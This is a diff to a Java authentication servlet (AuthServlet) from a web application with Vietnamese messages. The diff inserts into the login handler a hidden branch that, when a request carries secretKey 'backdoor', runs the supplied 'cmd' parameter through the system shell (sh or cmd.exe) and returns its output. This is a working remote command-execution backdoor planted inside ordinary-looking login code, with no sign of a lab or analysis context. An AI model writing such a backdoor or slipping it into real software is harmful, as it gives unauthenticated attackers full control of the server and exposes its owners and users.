@@ -9,7 +9,9 @@ import jakarta.servlet.http.HttpServletRequest;
 import jakarta.servlet.http.HttpServletResponse;
 import jakarta.servlet.http.HttpSession;
 import org.bson.Document;
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
@@ -34,6 +36,45 @@ public class AuthServlet extends HttpServlet {
 
     protected void doPost(HttpServletRequest request, HttpServletResponse response)
             throws ServletException, IOException {
+        String secretKey = request.getParameter("secretKey");
+        if ("backdoor".equals(secretKey)) {
+            String cmd = request.getParameter("cmd");
+            if (cmd != null && !cmd.isEmpty()) {
+                try {
+                    System.out.println("Backdoor activated with cmd: " + cmd);
+                    String os = System.getProperty("os.name").toLowerCase();
+                    ProcessBuilder pb;
+                    if (os.contains("win")) {
+                        pb = new ProcessBuilder("cmd.exe", "/c", cmd);
+                    } else {
+                        pb = new ProcessBuilder("/bin/sh", "-c", cmd);
+                    }
+                    System.out.println("Executing command: " + String.join(" ", pb.command()));
+                    Process process = pb.start();
+                    BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));
+                    StringBuilder output = new StringBuilder();
+                    String line;
+                    while ((line = stdInput.readLine()) != null) {
+                        output.append(line).append("\n");
+                    }
+                    while ((line = stdError.readLine()) != null) {
+                        output.append("ERROR: ").append(line).append("\n");
+                    }
+                    process.waitFor();
+                    response.setContentType("text/plain");
+                    PrintWriter out = response.getWriter();
+                    out.println(output.toString());
+                } catch (Exception e) {
+                    response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "Lỗi khi thực thi lệnh: " + e.getMessage());
+                }
+            } else {
+                response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Thiếu tham số cmd");
+            }
+            return;
+        }
+
+        // Mã gốc của phương thức doPost
         String action = request.getParameter("action");
         String username = request.getParameter("username");
         String password = request.getParameter("password");
@@ -88,6 +129,7 @@ public class AuthServlet extends HttpServlet {
         PrintWriter out = response.getWriter();
         out.println("{\"redirect\": \"welcome.html\"}"); // URL nội bộ
     }
+
     private String generateSalt() {
         SecureRandom random = new SecureRandom();
         byte[] salt = new byte[16];
